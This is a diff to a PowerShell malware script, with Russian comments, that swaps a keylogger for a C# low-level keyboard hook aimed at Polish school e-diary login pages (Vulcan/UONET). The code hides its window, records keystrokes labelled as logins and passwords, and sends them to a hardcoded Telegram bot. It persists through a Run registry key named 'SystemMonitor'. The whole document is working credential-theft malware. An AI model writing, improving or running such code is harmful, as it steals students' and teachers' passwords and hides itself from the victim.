@@ -20,225 +20,345 @@ try {
     if (!$wifi) {$wifi = "No WiFi networks"}
 } catch {$wifi = "WiFi error"}
 
-# УСОВЕРШЕНСТВОВАННЫЙ КЕЙЛОГГЕР ДЛЯ ПЕРЕХВАТА ЛОГИНА И ПАРОЛЯ ВУЛКАН
-# Создаем улучшенный кейлоггер
+# ИСПРАВЛЕННЫЙ КЕЙЛОГГЕР ДЛЯ ПЕРЕХВАТА ЛОГИНА И ПАРОЛЯ ВУЛКАН
 $keyloggerScript = @"
-Add-Type -AssemblyName System.Windows.Forms
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+using System.Text;
+using System.Linq;
 
-# Список целевых сайтов Вулкан
-`$vulcanUrls = @(
-    "*vulcan*",
-    "*uonetplus*", 
-    "*dziennik*",
-    "*edu.gdynia*",
-    "*eszkola.opolskie.pl*",
-    "*cufs.vulcan.net.pl*",
-    "*dziennik-logowanie.vulcan.net.pl*",
-    "*Account/LogOn*"
-)
+public class VulcanKeylogger
+{
+    private const int WH_KEYBOARD_LL = 13;
+    private const int WM_KEYDOWN = 0x0100;
+    private const int WM_SYSKEYDOWN = 0x0104;
+    
+    private static LowLevelKeyboardProc _proc = HookCallback;
+    private static IntPtr _hookID = IntPtr.Zero;
+    private static StringBuilder _buffer = new StringBuilder();
+    private static string _lastWindow = "";
+    private static DateTime _lastSendTime = DateTime.MinValue;
+    
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr GetForegroundWindow();
 
-`$capturedData = @()
-`$currentWindow = ""
-`$buffer = ""
-`$isVulcanSite = `$false
-`$lastSentData = ""
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
-function Send-ToTelegram {
-    param(`$message)
-    try {
-        `$body = @{
-            chat_id = '5674514050'
-            text = `$message
-        }
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$body
-    } catch { }
-}
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
 
-function Process-Buffer {
-    if(`$buffer -ne "" -and `$buffer -ne `$lastSentData) {
-        `$lastSentData = `$buffer
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+    [DllImport("user32.dll", SetLastError = true)]
+    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+    [DllImport("user32.dll", SetLastError = true)]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+    [DllImport("user32.dll", SetLastError = true)]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+    public static void Main()
+    {
+        // Скрываем консоль
+        var handle = GetConsoleWindow();
+        ShowWindow(handle, 0); // 0 = SW_HIDE
         
-        # Определяем тип данных по контексту
-        if(`$buffer -match "(login|user|username|uzytkownik|nazwa|email|e-mail|@)") {
-            Send-ToTelegram "VULCAN LOGIN: `$buffer"
-        } elseif(`$buffer -match "(password|haslo|pass|pwd)") {
-            Send-ToTelegram "VULCAN PASSWORD: `$buffer"
-        } else {
-            # Отправляем обычные данные
-            Send-ToTelegram "VULCAN INPUT: `$buffer"
+        _hookID = SetHook(_proc);
+        if (_hookID == IntPtr.Zero)
+        {
+            SendToTelegram("KEYLOGGER ERROR: Failed to set hook");
+            return;
         }
         
-        `$capturedData += `$buffer
-        `$buffer = ""
+        SendToTelegram("VULCAN KEYLOGGER STARTED - Monitoring Vulcan sites");
+        
+        Application.Run();
+        
+        UnhookWindowsHookEx(_hookID);
     }
-}
 
-while(`$true) {
-    try {
-        # Получаем активное окно
-        `$activeWindow = ""
-        `$processes = Get-Process | Where-Object {`$_.MainWindowTitle -and `$_.MainWindowHandle -ne 0} | Sort-Object CPU -Descending
-        if(`$processes) {
-            `$activeWindow = `$processes[0].MainWindowTitle
+    private static IntPtr SetHook(LowLevelKeyboardProc proc)
+    {
+        using (Process curProcess = Process.GetCurrentProcess())
+        using (ProcessModule curModule = curProcess.MainModule)
+        {
+            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+                GetModuleHandle(curModule.ModuleName), 0);
         }
-        
-        # Проверяем активное окно на наличие сайтов Вулкан
-        `$siteDetected = `$false
-        foreach(`$url in `$vulcanUrls) {
-            if(`$activeWindow -like `$url) {
-                `$siteDetected = `$true
-                break
-            }
-        }
-        
-        if(`$siteDetected) {
-            if(!`$isVulcanSite -or `$currentWindow -ne `$activeWindow) {
-                `$isVulcanSite = `$true
-                `$currentWindow = `$activeWindow
-                Send-ToTelegram "VULCAN SITE DETECTED: `$activeWindow"
-            }
-        } else {
-            if(`$isVulcanSite) {
-                `$isVulcanSite = `$false
-                Process-Buffer
-                Send-ToTelegram "USER LEFT VULCAN"
-            }
-        }
-        
-        # Перехватываем нажатия клавиш только на сайтах Вулкан
-        if(`$isVulcanSite) {
-            for(`$i = 8; `$i -lt 255; `$i++) {
-                `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
-                if(`$keyState -eq -32767) {
-                    `$key = [System.Windows.Forms.Keys]`$i
-                    
-                    # Обрабатываем специальные клавиши
-                    switch(`$key) {
-                        "Enter" { 
-                            Process-Buffer
-                        }
-                        "Space" { 
-                            `$buffer += " " 
-                        }
-                        "Back" { 
-                            if(`$buffer.Length -gt 0) { 
-                                `$buffer = `$buffer.Substring(0, `$buffer.Length - 1) 
-                            }
-                        }
-                        "Tab" { 
-                            `$buffer += "[TAB]"
-                            Process-Buffer
-                        }
-                        "LButton" { 
-                            # Клик мыши - обрабатываем буфер
-                            Process-Buffer
-                        }
-                        "RButton" { 
-                            # Правый клик - обрабатываем буфер
-                            Process-Buffer
-                        }
-                        default {
-                            # Обрабатываем обычные символы
-                            if(`$key -ge 65 -and `$key -le 90) {
-                                # Буквы A-Z
-                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                                `$isCaps = [System.Windows.Forms.Console]::CapsLock
-                                
-                                if((`$isShift -and !`$isCaps) -or (!`$isShift -and `$isCaps)) {
-                                    `$buffer += `$key.ToString()
-                                } else {
-                                    `$buffer += `$key.ToString().ToLower()
-                                }
-                            } elseif(`$key -ge 48 -and `$key -le 57) {
-                                # Цифры 0-9
-                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                                `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
-                                if(`$isShift) {
-                                    `$buffer += `$symbols[`$key - 48]
-                                } else {
-                                    `$buffer += (`$key - 48).ToString()
-                                }
-                            } elseif(`$key -eq 190 -or `$key -eq 110) {
-                                # Точка
-                                `$buffer += "."
-                            } elseif(`$key -eq 189 -or `$key -eq 109) {
-                                # Минус/дефис
-                                `$buffer += "-"
-                            } elseif(`$key -eq 187 -or `$key -eq 107) {
-                                # Плюс/равно
-                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                                if(`$isShift) {
-                                    `$buffer += "+"
-                                } else {
-                                    `$buffer += "="
-                                }
-                            } elseif(`$key -eq 186 -or `$key -eq 59) {
-                                # Точка с запятой/двоеточие
-                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                                if(`$isShift) {
-                                    `$buffer += ":"
-                                } else {
-                                    `$buffer += ";"
-                                }
-                            } elseif(`$key -eq 222) {
-                                # Кавычки/апостроф
-                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                                if(`$isShift) {
-                                    `$buffer += "`""
-                                } else {
-                                    `$buffer += "'"
-                                }
-                            } elseif(`$key -eq 220) {
-                                # Обратный слеш/прямой слеш
-                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                                if(`$isShift) {
-                                    `$buffer += "|"
-                                } else {
-                                    `$buffer += "\"
-                                }
-                            } elseif(`$key -eq 188 -or `$key -eq 108) {
-                                # Запятая/меньше
-                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                                if(`$isShift) {
-                                    `$buffer += "<"
-                                } else {
-                                    `$buffer += ","
-                                }
-                            } elseif(`$key -eq 191 -or `$key -eq 111) {
-                                # Слеш/вопрос
-                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
-                                if(`$isShift) {
-                                    `$buffer += "?"
-                                } else {
-                                    `$buffer += "/"
-                                }
-                            }
-                        }
+    }
+
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+    {
+        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
+        {
+            int vkCode = Marshal.ReadInt32(lParam);
+            
+            try
+            {
+                string activeWindow = GetActiveWindowTitle();
+                if (IsVulcanSite(activeWindow))
+                {
+                    ProcessKey(vkCode, activeWindow);
+                }
+                else
+                {
+                    // Если ушли с сайта Вулкан - отправляем оставшиеся данные
+                    if (_buffer.Length > 0 && _lastWindow.Contains("vulcan", StringComparison.OrdinalIgnoreCase))
+                    {
+                        SendBufferData("LEFT_VULCAN");
                     }
-                    
-                    # Автоматически отправляем длинные вводы
-                    if(`$buffer.Length -gt 30) {
-                        Process-Buffer
-                    }
+                    _buffer.Clear();
                 }
             }
+            catch (Exception ex)
+            {
+                // Игнорируем ошибки чтобы кейлоггер продолжал работать
+            }
         }
-    } catch { }
-    Start-Sleep -Milliseconds 2
+        
+        return CallNextHookEx(_hookID, nCode, wParam, lParam);
+    }
+
+    private static void ProcessKey(int vkCode, string windowTitle)
+    {
+        Keys key = (Keys)vkCode;
+        
+        // Обрабатываем специальные клавиши
+        switch (key)
+        {
+            case Keys.Enter:
+                _buffer.Append("[ENTER]");
+                SendBufferData("ENTER_PRESSED");
+                break;
+                
+            case Keys.Space:
+                _buffer.Append(" ");
+                break;
+                
+            case Keys.Back:
+                if (_buffer.Length > 0)
+                    _buffer.Remove(_buffer.Length - 1, 1);
+                break;
+                
+            case Keys.Tab:
+                _buffer.Append("[TAB]");
+                SendBufferData("TAB_PRESSED");
+                break;
+                
+            case Keys.LShiftKey:
+            case Keys.RShiftKey:
+            case Keys.Shift:
+            case Keys.ShiftKey:
+            case Keys.Control:
+            case Keys.ControlKey:
+            case Keys.LControlKey:
+            case Keys.RControlKey:
+            case Keys.Alt:
+            case Keys.LMenu:
+            case Keys.RMenu:
+            case Keys.CapsLock:
+            case Keys.NumLock:
+            case Keys.Scroll:
+                // Игнорируем служебные клавиши
+                break;
+                
+            default:
+                // Обрабатываем обычные символы
+                bool shiftPressed = (GetAsyncKeyState(Keys.ShiftKey) & 0x8000) != 0;
+                bool capsLock = Control.IsKeyLocked(Keys.CapsLock);
+                
+                string charStr = KeyToChar(key, shiftPressed, capsLock);
+                if (!string.IsNullOrEmpty(charStr))
+                {
+                    _buffer.Append(charStr);
+                }
+                break;
+        }
+        
+        // Автоматически отправляем каждые 30 символов или каждые 10 секунд
+        if (_buffer.Length >= 30 || (DateTime.Now - _lastSendTime).TotalSeconds >= 10)
+        {
+            SendBufferData("AUTO_SEND");
+        }
+        
+        _lastWindow = windowTitle;
+    }
+
+    private static string KeyToChar(Keys key, bool shift, bool capsLock)
+    {
+        // Буквы A-Z
+        if (key >= Keys.A && key <= Keys.Z)
+        {
+            if ((shift && !capsLock) || (!shift && capsLock))
+                return key.ToString().ToUpper();
+            else
+                return key.ToString().ToLower();
+        }
+        
+        // Цифры 0-9
+        if (key >= Keys.D0 && key <= Keys.D9)
+        {
+            if (shift)
+            {
+                string[] shiftChars = { ")", "!", "@", "#", "$", "%", "^", "&", "*", "(" };
+                return shiftChars[key - Keys.D0];
+            }
+            return (key - Keys.D0).ToString();
+        }
+        
+        // Цифровая клавиатура
+        if (key >= Keys.NumPad0 && key <= Keys.NumPad9)
+        {
+            return (key - Keys.NumPad0).ToString();
+        }
+        
+        // Специальные символы
+        switch (key)
+        {
+            case Keys.OemPeriod:
+            case Keys.Decimal:
+                return shift ? ">" : ".";
+            case Keys.Oemcomma:
+                return shift ? "<" : ",";
+            case Keys.OemQuestion:
+                return shift ? "?" : "/";
+            case Keys.Oemtilde:
+                return shift ? "~" : "`";
+            case Keys.OemOpenBrackets:
+                return shift ? "{" : "[";
+            case Keys.OemCloseBrackets:
+                return shift ? "}" : "]";
+            case Keys.OemPipe:
+                return shift ? "|" : "\\";
+            case Keys.OemMinus:
+                return shift ? "_" : "-";
+            case Keys.Oemplus:
+                return shift ? "+" : "=";
+            case Keys.OemSemicolon:
+                return shift ? ":" : ";";
+            case Keys.OemQuotes:
+                return shift ? "\"" : "'";
+            case Keys.Divide:
+                return "/";
+            case Keys.Multiply:
+                return "*";
+            case Keys.Subtract:
+                return "-";
+            case Keys.Add:
+                return "+";
+            case Keys.Decimal:
+                return ".";
+        }
+        
+        return "";
+    }
+
+    private static bool IsVulcanSite(string windowTitle)
+    {
+        if (string.IsNullOrEmpty(windowTitle))
+            return false;
+            
+        string[] vulcanKeywords = {
+            "vulcan", "uonet", "dziennik", "edu.gdynia", "eszkola", 
+            "logowanie", "login", "account", "uczen", "nauczyciel"
+        };
+        
+        return vulcanKeywords.Any(keyword => 
+            windowTitle.IndexOf(keyword, StringComparison.OrdinalIgnoreCase) >= 0);
+    }
+
+    private static string GetActiveWindowTitle()
+    {
+        try
+        {
+            const int nChars = 256;
+            StringBuilder buff = new StringBuilder(nChars);
+            IntPtr handle = GetForegroundWindow();
+
+            if (GetWindowText(handle, buff, nChars) > 0)
+            {
+                return buff.ToString();
+            }
+        }
+        catch { }
+        
+        return "";
+    }
+
+    [DllImport("user32.dll")]
+    private static extern short GetAsyncKeyState(Keys vKey);
+
+    private static void SendBufferData(string trigger)
+    {
+        if (_buffer.Length == 0)
+            return;
+            
+        string data = _buffer.ToString();
+        if (string.IsNullOrWhiteSpace(data))
+            return;
+            
+        string message = $"VULCAN INPUT ({trigger}): {data}";
+        
+        try
+        {
+            SendToTelegram(message);
+            _lastSendTime = DateTime.Now;
+        }
+        catch { }
+        
+        _buffer.Clear();
+    }
+
+    private static void SendToTelegram(string message)
+    {
+        try
+        {
+            using (var webClient = new System.Net.WebClient())
+            {
+                string url = $"https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage";
+                string postData = $"chat_id=5674514050&text={Uri.EscapeDataString(message)}";
+                
+                webClient.Headers[System.Net.HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
+                webClient.UploadString(url, postData);
+            }
+        }
+        catch
+        {
+            // Игнорируем ошибки отправки
+        }
+    }
 }
 "@
 
-# Сохраняем и запускаем улучшенный кейлоггер
+# Сохраняем и запускаем исправленный кейлоггер
 try {
-    $keyloggerScript | Out-File "$env:TEMP\vulcan_logger.ps1" -Encoding ASCII
-    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\vulcan_logger.ps1`"" -WindowStyle Hidden
+    # Компилируем как .NET приложение
+    Add-Type -TypeDefinition $keyloggerScript -ReferencedAssemblies "System.Windows.Forms", "System.Drawing" -Language CSharp
+    
+    # Запускаем в отдельном процессе
+    $keyloggerProcess = Start-Process -FilePath "powershell" -ArgumentList @"
+-Command "Add-Type -TypeDefinition '@$keyloggerScript' -ReferencedAssemblies 'System.Windows.Forms','System.Drawing' -Language CSharp; [VulcanKeylogger]::Main()" -WindowStyle Hidden
+"@ -WindowStyle Hidden -PassThru
     
     # Добавляем в автозагрузку
     $startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\vulcan_logger.ps1`""
+    $loggerCommand = "powershell -WindowStyle Hidden -Command `"Add-Type -TypeDefinition '@$keyloggerScript' -ReferencedAssemblies 'System.Windows.Forms','System.Drawing' -Language CSharp; [VulcanKeylogger]::Main()`""
     Set-ItemProperty -Path $startupPath -Name "SystemMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
     
-    $keyloggerStatus = "Advanced keylogger active - monitoring Vulcan sites"
+    $keyloggerStatus = "ADVANCED KEYLOGGER ACTIVE - Monitoring Vulcan sites (C# version)"
 } catch {
     $keyloggerStatus = "Keylogger failed: $($_.Exception.Message)"
 }
